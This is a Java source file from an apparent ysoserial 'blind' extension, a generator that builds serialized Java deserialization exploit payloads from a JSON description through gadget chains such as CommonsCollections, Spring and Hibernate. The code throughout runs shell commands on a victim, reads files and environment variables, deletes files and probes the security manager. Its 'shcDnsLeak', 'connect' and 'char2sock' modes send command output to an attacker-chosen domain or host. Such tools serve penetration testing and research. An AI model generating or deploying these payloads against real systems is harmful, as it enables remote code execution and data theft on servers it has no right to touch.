package ysoserial.blind;

import javassist.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.json.JSONArray;
import org.json.JSONObject;
import ysoserial.Serializer;
import ysoserial.payloads.*;

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.Inet4Address;
import java.net.Socket;
import java.net.URL;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Apache Commons payload generator.
 * Builds binary payloads ready to execute based on the JSON specification.
 * Uses JSON-based language to express the payload to generate.
 *
 * Created by dusanklinec on 04.09.16.
 */
public class Generator {
    private static final String FLD_EXEC = "exec";
    private static final String FLD_CMD = "cmd";
    private static final String FLD_ARGS = "args";

    private static final SecureRandom rand = new SecureRandom();
    private static final AtomicLong classCtr = new AtomicLong(1);
    private final ClassPool cp = ClassPool.getDefault();
    private final Map<String, Object> evaluators = new HashMap<>();

    public static void main(final String[] args) throws Exception {
        new Generator().mainInst(args);
    }

    public byte[] mainInst(final String[] args) throws Exception {
        if (args.length != 1){
            log("Use json pls");
            return null;
        }

        return mainParse(args[0]);
    }

    public byte[] mainParse(String json) throws Exception {
        final JSONObject root = Utils.parseJSON(json);
        return mainParse(root);
    }

    public byte[] mainParse(final JSONObject root) throws Exception {
        // Final payload goes here.
        Object object = null;
        Object payload = null;
        ObjectPayloadRaw exploitModule = null;

        // Not a transformer object?
        if (root.has("javassist")){
            final String module = root.getString("javassist");
            exploitModule = getExploitModule(module);
            payload = exploitModule.getObject(root.getString("code"));

        } else {
            // Commons {1,5,6} Transformer based exploits - the core.
            Transformer[] transformers = parseExec(root);

            // Terminating transformer?
            final Transformer[] terminal = Commons1Gadgets.getTerminalTransformer(
                    !root.has("valid") || Utils.getAsBoolean(root, "valid"));
            transformers = Commons1Gadgets.mergeTrans(transformers, terminal);

            // Exploit module.
            int module = 1;
            if (root.has("module")) {
                module = root.getInt("module");
            }

            exploitModule = getExploitModule(module);
            payload = exploitModule.getObject(transformers);
        }

        // Final payload goes here.
        object = payload;

        // Wrapping collection?
        if (root.has("wrap")){
            final JSONObject wrap = root.getJSONObject("wrap");
            object = parseWrap(wrap, payload);
        }

        // Construct binary payload.
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Serializer.serialize(object, bos);
        ObjectPayloadRaw.Utils.releasePayload(exploitModule, object);

        final byte[] result = bos.toByteArray();
        bos.close();

        return result;
    }

    public Object parseWrap(JSONObject wrap, Object payload) throws NoSuchMethodException, ClassNotFoundException, InstantiationException, CannotCompileException, IllegalAccessException, InvocationTargetException, IOException {
        final String type = wrap.getString("type");

        Object into = null;
        if (wrap.has("into")) {
            into = parseConst(wrap.getJSONObject("into"));
        }

        Object key = null;
        if (wrap.has("key")){
            key = parseConst(wrap.get("key"));
        }

        Object finalResult = into;
        switch(type){
            case "map":{
                finalResult = into != null ? into : new HashMap<Object, Object>();
                final Map<Object, Object> coll = (Map<Object, Object>) finalResult;
                coll.put(key, payload);

                break;}

            case "list":{
                finalResult = into != null ? into : new ArrayList<Object>();
                final List<Object> coll = (List<Object>) finalResult;
                coll.add(payload);

                break;}

            case "set":{
                finalResult = into != null ? into : new HashSet<Object>();
                final Set<Object> coll = (Set<Object>) finalResult;
                coll.add(payload);

                break;}

            case "vector":{
                finalResult = into != null ? into : new Vector<Object>();
                final Vector<Object> coll = (Vector<Object>) finalResult;
                coll.add(payload);

                break;}

            case "stack":{
                finalResult = into != null ? into : new Stack<Object>();
                final Stack<Object> coll = (Stack<Object>) finalResult;
                coll.add(payload);

                break;}
            default:
                throw new RuntimeException("Unknown wrapping mode");
        }

        return finalResult;
    }

    public ObjectPayloadRaw getExploitModule(int version){
        switch(version){
            case 1: return new CommonsCollections1Raw();
            case 5: return new CommonsCollections5Raw();
            case 6: return new CommonsCollections6Raw();
            default: throw new RuntimeException("Unknown exploit module");
        }
    }

    public ObjectPayloadRaw getExploitModule(String name){
        switch(name){
            case "cb1": return new CommonsBeanutils1Raw();
            case "cc2": return new CommonsCollections2Raw();
            case "cc3": return new CommonsCollections3Raw();
            case "cc4": return new CommonsCollections4Raw();

            case "hibernate": return new Hibernate1Raw();
            case "weld": return new JavassistWeld1Raw();
            case "jboss": return new JBossInterceptors1Raw();
            case "jdk7": return new Jdk7u21Raw();
            case "json": return new JSON1Raw();

            case "rhino": return new MozillaRhino1Raw();
            case "rome": return new ROMERaw();
            case "spring1": return new Spring1Raw();
            case "spring2": return new Spring2Raw();

            default: throw new RuntimeException("Unknown exploit module: " + name);
        }
    }

    public Transformer asTrans(Object obj){
        if (obj instanceof Transformer){
            return (Transformer) obj;
        } else if (obj instanceof Transformer[]){
            return new ChainedTransformer((Transformer[])obj);
        } else if (obj instanceof Closure){
            return TransformerUtils.asTransformer((Closure)obj);
        } else if (obj instanceof Closure[]){
            return TransformerUtils.asTransformer(ClosureUtils.chainedClosure((Closure[])obj));
        } else if (obj instanceof Predicate) {
            return TransformerUtils.asTransformer((Predicate) obj);
        } else if (obj instanceof Object[]){
            final Object[] oArray = (Object[]) obj;
            final Transformer[] nArray = new Transformer[oArray.length];
            for(int i = 0, ln = oArray.length; i < ln; i++){
                nArray[i] = asTrans(oArray[i]);
            }

            return TransformerUtils.chainedTransformer(nArray);
        } else {
            throw new RuntimeException("Cannot convert to transformer");
        }
    }

    public Predicate asPredicate(Object obj){
        if (obj instanceof Predicate){
            return (Predicate)obj;
        } else if (obj instanceof Transformer){
            return PredicateUtils.asPredicate((Transformer)obj);
        } else if (obj instanceof Transformer[]){
            return PredicateUtils.asPredicate(TransformerUtils.chainedTransformer((Transformer[])obj));
        } else if (obj instanceof Object[]){
            final Object[] oArray = (Object[]) obj;
            final Transformer[] nArray = new Transformer[oArray.length];
            for(int i = 0, ln = oArray.length; i < ln; i++){
                nArray[i] = asTrans(oArray[i]);
            }

            return PredicateUtils.asPredicate(TransformerUtils.chainedTransformer(nArray));
        } else {
            throw new RuntimeException("Cannot convert to predicate: " + obj);
        }
    }

    public Closure asClosure(Object obj){
        if (obj instanceof Closure){
            return (Closure)obj;
        } else if (obj instanceof Closure[]){
            return ClosureUtils.chainedClosure((Closure[])obj);
        } else if (obj instanceof Transformer){
            return ClosureUtils.asClosure((Transformer)obj);
        } else if (obj instanceof Transformer[]){
            return ClosureUtils.asClosure(TransformerUtils.chainedTransformer((Transformer[])obj));
        } else if (obj instanceof Predicate) {
            return ClosureUtils.asClosure(asTrans((Predicate) obj));
        } else if (obj instanceof Object[]){
            final Object[] oArray = (Object[]) obj;
            final Closure[] nArray = new Closure[oArray.length];
            for(int i = 0, ln = oArray.length; i < ln; i++){
                nArray[i] = asClosure(oArray[i]);
            }

            return ClosureUtils.chainedClosure(nArray);
        } else {
            throw new RuntimeException("Cannot convert to closure");
        }
    }

    public void initCp(){
        cp.insertClassPath(new ClassClassPath(File.class));
        cp.insertClassPath(new ClassClassPath(URL.class));
        cp.insertClassPath(new ClassClassPath(Socket.class));
        cp.insertClassPath(new ClassClassPath(Inet4Address.class));
    }

    public Object eval(String expr, boolean addReturn) throws CannotCompileException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        //https://jboss-javassist.github.io/javassist/tutorial/tutorial.html
        if (addReturn){
            expr = "return (" + expr + ");";
        }

        Object evaluator = evaluators.get(expr);
        if (evaluator == null){
            String className = "Eval" + classCtr.incrementAndGet();
            final CtClass ctClass = cp.makeClass(className);
            final String methodDef = "public Object eval(){ "+expr+" }";
            final CtMethod meth = CtNewMethod.make(methodDef, ctClass);
            ctClass.addMethod(meth);
            Class c = ctClass.toClass();
            evaluator = c.newInstance();
            evaluators.put(expr, evaluator);
        }

        Object res = evaluator.getClass().getMethod("eval").invoke(evaluator);
        return res;
    }

    public void testEval() throws Exception{
        System.out.println(eval("Integer.valueOf(1)", true));
        System.out.println(eval("Double.valueOf(3.14)", true));
        System.out.println(eval("\"Hello world\"", true));
        System.out.println(eval("new java.io.File(\"/etc/passwd\")", true));
        System.out.println(eval("new int[]{1,2,3}", true));
        System.out.println(eval("java.util.HashMap hm = new java.util.HashMap(); " +
                "hm.put(\"abc\", \"def\");" +
                "hm.put(\"hello\", \"world\");" +
                "return hm;", false));
    }

    public Object parseConst(Object stmt) throws InvocationTargetException, NoSuchMethodException, CannotCompileException, InstantiationException, IllegalAccessException, IOException, ClassNotFoundException {
        if (stmt == null){
            return null;
        } else if (stmt instanceof JSONObject) {
            return parseConstJson((JSONObject) stmt);
        } else if (stmt instanceof JSONArray){
            return parseConstArray((JSONArray) stmt);
        } else {
            return stmt; // trivial type, hopefully.
        }
    }

    public Object parseConstArray(JSONArray array) throws NoSuchMethodException, ClassNotFoundException, InstantiationException, CannotCompileException, IllegalAccessException, InvocationTargetException, IOException {
        final int len = array.length();
        final Object[] res = new Object[len];
        for(int i = 0; i < len; i++){
            res[i] = parseConst(array.get(i));
        }

        return res;
    }

    public Object parseConstJson(JSONObject stmt) throws InvocationTargetException, NoSuchMethodException, CannotCompileException, InstantiationException, IllegalAccessException, IOException, ClassNotFoundException {
        Object obj = null;
        if (stmt.has("null")){
            return null;

        }  else if (stmt.has("val")){
            obj = stmt.get("val");

        } else if (stmt.has("long")){
            obj = stmt.getLong("long");

        } else if (stmt.has("eval")){
            obj = eval(stmt.getString("eval"), true);

        }  else if (stmt.has("eval2")){
            obj = eval(stmt.getString("eval2"), false);

        } else if (stmt.has("des")){
            final ObjectInputStream ois = new ObjectInputStream(
                    new ByteArrayInputStream(
                            DatatypeConverter.parseBase64Binary(stmt.getString("des"))));
            obj = ois.readObject();
            ois.close();

        } else {
            throw new RuntimeException("Unknown command");
        }

        return obj;
    }

    public Class getClass(String className) throws InvocationTargetException, NoSuchMethodException, CannotCompileException, InstantiationException, IllegalAccessException {
        return (Class)eval("Class.forName(\"" + className + "\")", true);
    }

    public Class inferType(Object obj){
        if (obj == null){
            throw new RuntimeException("Cannot infer type from null");
        }

        return obj.getClass();
    }

    public void parseArgs(JSONArray argsArr, List<Object> args, List<Class> types) throws NoSuchMethodException, ClassNotFoundException, InstantiationException, CannotCompileException, IllegalAccessException, InvocationTargetException, IOException {
        for(int i = 0, ln = argsArr.length(); i < ln; i++){
            final Object o = argsArr.get(i);

            Object subVal = null;
            Class subType = null;

            if (o instanceof JSONObject){
                final JSONObject sub = (JSONObject) o;
                subVal = parseConst(sub);
                subType = sub.has("type") ? getClass(sub.getString("type")) : inferType(subVal);

            } else {
                subVal = o;
                subType = inferType(subVal);
            }

            args.add(subVal);
            types.add(subType);
        }
    }

    public Object parseObj(Object obj) throws NoSuchMethodException, ClassNotFoundException, InstantiationException, CannotCompileException, IllegalAccessException, InvocationTargetException, IOException {
        if (obj instanceof JSONObject) {
            return parseObjJSON((JSONObject) obj);
        } else if (obj instanceof JSONArray){
            return parseObjArr((JSONArray) obj);
        } else {
            throw new RuntimeException("Unknown object type");
        }
    }

    public Object parseObjArr(JSONArray array) throws NoSuchMethodException, ClassNotFoundException, InstantiationException, CannotCompileException, IllegalAccessException, InvocationTargetException, IOException {
        final int len = array.length();
        final Object[] res = new Object[len];
        for(int i = 0; i < len; i++){
            res[i] = parseObj(array.get(i));
        }

        return res;
    }

    public Object parseObjJSON(JSONObject stmt) throws NoSuchMethodException, ClassNotFoundException, InstantiationException, CannotCompileException, IllegalAccessException, InvocationTargetException, IOException {
        final String cmd = stmt.getString(FLD_CMD);
        Object result = null;

        switch(cmd){
            // -----------------------------------------------------------------
            // Transformers
            // ----------------------------------------------------------------

            case "const":{
                Object obj = parseConst(stmt);
                result = new ConstantTransformer(obj);
                break;}

            case "block": {
                final LinkedList<Transformer> trans = new LinkedList<>();
                final JSONArray sub = stmt.getJSONArray("sub");
                for(int i = 0, ln = sub.length(); i < ln; i++){
                    trans.add(asTrans(parseObj(sub.get(i))));
                }
                result = TransformerUtils.chainedTransformer(trans);
                break;}

            case "exc":
                result = TransformerUtils.exceptionTransformer();
                break;

            case "nop":
                result = TransformerUtils.nopTransformer();
                break;

            case "invoke":{
                final String method = stmt.getString("method");
                final List<Object> args = new LinkedList<>();
                final List<Class> types = new LinkedList<>();

                if (stmt.has("args")) {
                    final JSONArray argsArr = stmt.getJSONArray("args");
                    parseArgs(argsArr, args, types);
                }

                result = args.isEmpty()?
                        TransformerUtils.instantiateTransformer() :
                        TransformerUtils.invokerTransformer(
                                method,
                                types.toArray(new Class[types.size()]),
                                args.toArray(new Object[args.size()]));
                break;}

            case "new":{
                final List<Object> args = new LinkedList<>();
                final List<Class> types = new LinkedList<>();

                if (stmt.has("args")) {
                    final JSONArray argsArr = stmt.getJSONArray("args");
                    parseArgs(argsArr, args, types);
                }

                result = args.isEmpty() ?
                        TransformerUtils.instantiateTransformer() :
                        TransformerUtils.instantiateTransformer(
                                types.toArray(new Class[types.size()]),
                                args.toArray(new Object[args.size()]));
                break;}

            // -----------------------------------------------------------------
            // Closures
            // ----------------------------------------------------------------
            case "cblock":{
                final LinkedList<Closure> clos = new LinkedList<>();
                final JSONArray sub = stmt.getJSONArray("sub");
                for(int i = 0, ln = sub.length(); i < ln; i++){
                    clos.add(asClosure(parseObj(sub.get(i))));
                }
                result = ClosureUtils.chainedClosure(clos);
                break;}

            case "if":{
                final Predicate pred = asPredicate(parseObj(stmt.get("pred")));
                final Closure then = asClosure(parseObj(stmt.get("then")));
                Closure els = ClosureUtils.nopClosure();
                if (stmt.has("els")) {
                    els = asClosure(parseObj(stmt.get("els")));
                }
                result = ClosureUtils.ifClosure(pred, then, els);
                break;}

            case "while":{
                final Predicate pred = asPredicate(parseObj(stmt.get("pred")));
                final Closure clos = asClosure(parseObj(stmt.get("do")));
                result = ClosureUtils.whileClosure(pred, clos);
                break;}

            case "for":{
                final int to = stmt.getInt("to");
                final Closure clos = asClosure(parseObj(stmt.get("do")));
                result = ClosureUtils.forClosure(to, clos);
                break;}

            case "switch":{
                Closure def = ClosureUtils.nopClosure();
                if (stmt.has("default")){
                    def = asClosure(parseObj(stmt.get("default")));
                }

                JSONArray lines = stmt.getJSONArray("clauses");
                final int ln = lines.length();
                if ((ln & 1) == 1){
                    throw new RuntimeException("Even number of clauses, has to be [predicate, closure]...");
                }

                List<Predicate> predicates = new LinkedList<>();
                List<Closure> closures = new LinkedList<>();
                for (int i = 0; i < ln; i+=2){
                    predicates.add(asPredicate(parseObj(lines.get(i))));
                    closures.add(asClosure(parseObj(lines.get(i))));
                }

                result = ClosureUtils.switchClosure(
                        predicates.toArray(new Predicate[predicates.size()]),
                        closures.toArray(new Closure[closures.size()]),
                        def);
                break;}

            // -----------------------------------------------------------------
            // Predicates
            // ----------------------------------------------------------------
            case "and":{
                List<Predicate> predicates = new LinkedList<>();
                JSONArray lines = stmt.getJSONArray("clauses");
                for (int i = 0, ln = lines.length(); i < ln; i++){
                    predicates.add(asPredicate(parseObj(lines.get(i))));
                }

                result = predicates.size() == 2 ?
                        PredicateUtils.andPredicate(predicates.get(0), predicates.get(1)) :
                        PredicateUtils.allPredicate(predicates);
                break;}

            case "or":{
                List<Predicate> predicates = new LinkedList<>();
                JSONArray lines = stmt.getJSONArray("clauses");
                for (int i = 0, ln = lines.length(); i < ln; i++){
                    predicates.add(asPredicate(parseObj(lines.get(i))));
                }

                result = predicates.size() == 2 ?
                        PredicateUtils.orPredicate(predicates.get(0), predicates.get(1)) :
                        PredicateUtils.anyPredicate(predicates);
                break;}

            case "not":{
                final Predicate pred = asPredicate(parseObj(stmt.get("pred")));
                result = PredicateUtils.notPredicate(pred);
                break;}

            case "equals":{
                result = PredicateUtils.equalPredicate(parseObj(stmt.get("val")));
                break;}

            case "instanceof":{
                Class cls = getClass(stmt.getString("val"));
                result = PredicateUtils.instanceofPredicate(cls);
                break;}

            case "pnull":{
                result = PredicateUtils.nullPredicate();
                break;}

            case "pnotnull":{
                result = PredicateUtils.notNullPredicate();
                break;}

            case "pnullexc":{
                final Predicate pred = asPredicate(parseObj(stmt.get("pred")));
                result = PredicateUtils.nullIsExceptionPredicate(pred);
                break;}

            case "pnullfalse":{
                final Predicate pred = asPredicate(parseObj(stmt.get("pred")));
                result = PredicateUtils.nullIsFalsePredicate(pred);
                break;}

            case "pnulltrue":{
                final Predicate pred = asPredicate(parseObj(stmt.get("pred")));
                result = PredicateUtils.nullIsTruePredicate(pred);
                break;}

            case "pexcept":{
                result = PredicateUtils.exceptionPredicate();
                break;}

            // -----------------------------------------------------------------
            // Macros
            // ----------------------------------------------------------------
            case "classload":{
                final String cls = stmt.getString("val");
                result = Commons1Gadgets.classLoaderTransformer(cls);
                break;}

            case "staticExec":{
                String cls = null;
                if (stmt.has("class")){
                    cls = stmt.getString("class");
                }

                final String method = stmt.getString("method");
                final List<Object> args = new LinkedList<>();
                final List<Class> types = new LinkedList<>();

                if (stmt.has("args")) {
                    final JSONArray argsArr = stmt.getJSONArray("args");
                    parseArgs(argsArr, args, types);
                }

                result = cls == null ?
                        Commons1Gadgets.invokeStaticMethodTransformer(method,
                                types.toArray(new Class[types.size()]),
                                args.toArray(new Object[args.size()])) :
                        Commons1Gadgets.invokeStaticMethodTransformer(cls, method,
                                types.toArray(new Class[types.size()]),
                                args.toArray(new Object[args.size()]));
                break;}

            case "sleep":{
                final long time = stmt.getLong("val");
                result = Commons1Gadgets.getSleepTransformer(time);
                break;}

            case "connect":{
                final String host = stmt.getString("host");
                final int port = stmt.getInt("port");
                result = Commons1Gadgets.getConnectToTransformer(host, port);
                break;}

            case "bashc":{
                final String[] execCmd = new String[] {"/bin/bash", "-c", stmt.getString("val")};
                result = Commons1Gadgets.getExecTransformer(execCmd);
                break;
            }

            case "shc":{
                final String[] execCmd = new String[] {"/bin/sh", "-c", stmt.getString("val")};
                result = Commons1Gadgets.getExecTransformer(execCmd);
                break;
            }

            case "shcDnsLeak":{
                final String domain = stmt.getString("domain");
                final String exec = stmt.getString("val");
                String execString = String.format(
                        "ping -c 1 `%s | base64 | tr -d '=' | tr -d '\\n' | tr '+/' '-_'`.%s",
                        exec, domain);

                int step = 120;
                if (stmt.has("offset")){
                    int offset = stmt.getInt("offset");
                    execString = String.format(
                            "ping -c 1 `%s | base64 | tr -d '=' | tr -d '\\n' | tr '+/' '-_' | head -c %d | tail -c %d`.%s",
                            exec, offset, step, domain);
                }

                final String[] execCmd = new String[] {"/bin/sh", "-c", execString};
                result = Commons1Gadgets.getExecTransformer(execCmd);
                break;
            }

            case "execRuntime":{
                final Object inp = stmt.get("val");
                if (inp instanceof JSONArray){
                    JSONArray jarr = (JSONArray) inp;
                    String[] args = new String[jarr.length()];
                    for(int i = 0, ln = jarr.length(); i < ln; i++){
                        args[i] = (String)jarr.get(i);
                    }
                    result = Commons1Gadgets.getExecTransformer(args);

                } else if (inp instanceof String) {
                    result = Commons1Gadgets.getExecTransformer((String)inp);
                } else {
                    throw new RuntimeException("Unrecognized input type");
                }

                break;
            }

            case "execWait":{
                final SecureRandom rnd = new SecureRandom();
                String fnamePrefix = Utils.getAsString(stmt, "tmpPrefix", "/tmp/.x");
                String fnameSuffix = Utils.getAsString(stmt, "tmpSuffix", "" + Math.abs(rnd.nextInt()));
                String fnameTotal = stmt.has("fname") ? stmt.getString("fname") : null;
                final String fname = fnameTotal != null ? fnameTotal : fnamePrefix + fnameSuffix;
                final String touchSnippet = "touch " + fname + "; sleep 2; /bin/rm " + fname;

                int waitIterations = 80;
                if (stmt.has("waitIter")){
                    waitIterations = stmt.getInt("waitIter");
                }

                long subsleep = 250;
                if (stmt.has("sleep")){
                    subsleep = stmt.getLong("sleep");
                }

                // Single command?
                Object execCmd = null;
                boolean single = false;

                if (stmt.has("execFull")){
                    final Object execObj = stmt.get("exec");
                    final Object execParsed = parseConst(execObj);
                    if (execParsed instanceof Object[]){
                        final String[] execStr = (String[]) execParsed;
                        execStr[execStr.length-1] += " ; " + touchSnippet;
                        execCmd = execStr;
                    } else {
                        execCmd = ((String) execParsed) + touchSnippet;
                        single = true;
                    }
                }

                if (stmt.has("exec")){
                    execCmd = new String[] {"/bin/bash", "-c", stmt.getString("exec") + ";" + touchSnippet};
                }

                final Merger<Transformer> trMerge = new Merger<>(
                        Commons1Gadgets.packToOne(
                                single ?
                                        Commons1Gadgets.getExecTransformer((String)execCmd) :
                                        Commons1Gadgets.getExecTransformer((String[])execCmd)
                        ),

                        // Waiting for process to finish.
                        // for(i=0; i<80; i++)
                        //    while(!fileExists(fname)) Sleep(250);
                        //
                        TransformerUtils.asTransformer(
                                new ForClosure(waitIterations,
                                        new WhileClosure(
                                                PredicateUtils.notPredicate(Commons1Gadgets.fileExistsPredicate(fname)),
                                                ClosureUtils.asClosure(Commons1Gadgets.packToOne(Commons1Gadgets.getSleepTransformer(subsleep))),
                                                false
                                        )))
                );

                // Delete the temporary file
                trMerge.add(Commons1Gadgets.fileTransformer(fname));
                trMerge.add(new InvokerTransformer("delete", null, null));
                result = trMerge.toArray(Transformer.class);
                break;}

            case "java":{
                final int version = stmt.getInt("val");
                switch(version){
                    case 4: result = Commons1Gadgets.hasJava4Transformer(); break;
                    case 5: result = Commons1Gadgets.hasJava5Transformer(); break;
                    case 6: result = Commons1Gadgets.hasJava6Transformer(); break;
                    case 7: result = Commons1Gadgets.hasJava7Transformer(); break;
                    case 8: result = Commons1Gadgets.hasJava8Transformer(); break;
                    default: throw new RuntimeException("Unrecognized version");
                }
                break;}

            case "file":{
                final String path = stmt.getString("val");
                result = Commons1Gadgets.fileTransformer(path);
                break;}

            case "fileEx":{
                final String path = stmt.getString("val");
                result = Commons1Gadgets.fileExistsPredicate(path);
                break;}

            case "fileDelete":{
                final String path = stmt.getString("val");
                result = Commons1Gadgets.mergeTrans(
                        Commons1Gadgets.fileTransformer(path),
                        new Transformer[]{
                                new InvokerTransformer("delete",
                                        null, null),
                        });
                break;}

            case "fileCanRead":{
                final String path = stmt.getString("val");
                result = Commons1Gadgets.mergeTrans(
                        Commons1Gadgets.fileTransformer(path),
                        new Transformer[]{
                                new InvokerTransformer("canRead",
                                        null, null),
                        });
                break;}

            case "fileCanWrite":{
                final String path = stmt.getString("val");
                result = Commons1Gadgets.mergeTrans(
                        Commons1Gadgets.fileTransformer(path),
                        new Transformer[]{
                                new InvokerTransformer("canWrite",
                                        null, null),
                        });
                break;}

            case "fileCanExecute":{
                final String path = stmt.getString("val");
                result = Commons1Gadgets.mergeTrans(
                        Commons1Gadgets.fileTransformer(path),
                        new Transformer[]{
                                new InvokerTransformer("canExecute",
                                        null, null),
                        });
                break;}

            case "fileRead": {
                final String path = stmt.getString("val");
                result = Commons1Gadgets.fileReadToString01Transformer(path);
                break;
            }

            case "fileRead2": {
                final String path = stmt.getString("val");
                result = Commons1Gadgets.fileReadToString02Transformer(path);
                break;
            }

            case "property": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.readSystemPropertyToStringTransformer(val);
                break;
            }

            case "env": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.readEnvPropertyToStringTransformer(val);
                break;
            }

            case "toString": {
                result = Commons1Gadgets.toStringTransformer();
                break;
            }

            case "trim": {
                result = Commons1Gadgets.strTrimTransformer();
                break;
            }

            case "toLower": {
                result = Commons1Gadgets.strToLowerCaseTransformer();
                break;
            }

            case "toUpper": {
                result = Commons1Gadgets.strToUpperCaseTransformer();
                break;
            }

            case "substr": {
                final int start = stmt.getInt("start");
                Integer stop = null;
                if (stmt.has("stop")){
                    stop = stmt.getInt("stop");
                }

                result = stop == null ?
                        Commons1Gadgets.strSubstringTransformer(start) :
                        Commons1Gadgets.strSubstringTransformer(start, stop);

                break;
            }

            case "isEmpty": {
                result = Commons1Gadgets.isEmptyPredicate();
                break;
            }

            case "strEquals": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.equalsPredicate(val);
                break;
            }

            case "strEqualsIgnoreCase": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.equalsIgnoreCasePredicate(val);
                break;
            }

            case "matches": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.matchesPredicate(val);
                break;
            }

            case "startsWith": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.startsWithPredicate(val);
                break;
            }

            case "endsWith": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.endsWithPredicate(val);
                break;
            }

            case "contains": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.containsPredicate(val);
                break;
            }

            case "char2sock": {
                final Integer val = stmt.has("pos") ? stmt.getInt("pos") : null;
                final String host = stmt.getString("host");
                final int port = stmt.getInt("port");
                result = Commons1Gadgets.charToSocket(host, port, val);
                break;
            }

            case "secMgr": {
                result = Commons1Gadgets.getSecurityManagerTransformer();
                break;
            }

            case "secConnect": {
                final String host = stmt.getString("host");
                final int port = stmt.getInt("port");
                result = Commons1Gadgets.secMgrCheckConnectTransformer(host, port);
                break;
            }

            case "secExec": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.secMgrCheckExecTransformer(val);
                break;
            }

            case "secRead": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.secMgrCheckReadTransformer(val);
                break;
            }

            case "secWrite": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.secMgrCheckWriteTransformer(val);
                break;
            }

            case "secDelete": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.secMgrCheckDeleteTransformer(val);
                break;
            }

            case "secPkg": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.secMgrCheckPackageAccessTransformer(val);
                break;
            }

            case "secProp": {
                final String val = stmt.getString("val");
                result = Commons1Gadgets.secMgrCheckPropertyAccessTransformer(val);
                break;
            }

            case "lengthTest": {
                // Test the length limit on the victim.
                final long bytes = stmt.getLong("val");
                StringBuilder sb = new StringBuilder();
                for(long i = 0; i < bytes; i++) sb.append(String.valueOf((char)65 + rand.nextInt(26)));
                result = new ConstantTransformer(sb.toString());
                break;
            }

            default:
                log("unknown command");
                throw new RuntimeException("Unknown command");
        }

        return result;
    }

    public Transformer[] parseExec(final JSONObject root) throws NoSuchMethodException, InstantiationException, IOException, CannotCompileException, IllegalAccessException, InvocationTargetException, ClassNotFoundException {
        initCp();

//        String jsonToParse = "{exec: [ {cmd:\"const\", val:\"holla!\" } ] }";
//        String jsonToParse = "{exec: [ {cmd:\"const\", val:10 } ] }";
//        String jsonToParse = "{exec: [ {cmd:\"const\", val:0.5 } ] }";
//        String jsonToParse = "{exec: [ {cmd:\"const\", val:false } ] }";
//        String jsonToParse = "{exec: [ {cmd:\"const\", eval:\"new int[]{1,2,3}\" } ] }";

        // Collect transformers to execute in the chain here.
        LinkedList<Transformer> trans = new LinkedList<>();

        // Process root element.
        final JSONArray exec = root.getJSONArray(FLD_EXEC);
        for(int i = 0, ln = exec.length(); i < ln; i++){
            final Object res = parseObj(exec.get(i));
            trans.add(asTrans(res));
        }

        // Return final transformer array.
        final Transformer[] transArray = trans.toArray(new Transformer[trans.size()]);
        return transArray;

        // exec - terminating statement, wrapping statement. extension points.
        // {exec: [
        //     {cmd:'staticCall', args:['Thread', 'sleep', types:[ 'Long.TYPE' ], args:[7000] ] },
        //     {cmd:'sleep', args:[7000] },
        //     {cmd:'new', args:['Thread', 'sleep', types:[ 'Long.TYPE' ], args:[7000] ] },
        //
        // ] }
    }

    public void log(String fmt, Object ... args){
        System.out.println(String.format(fmt, args));
    }


}
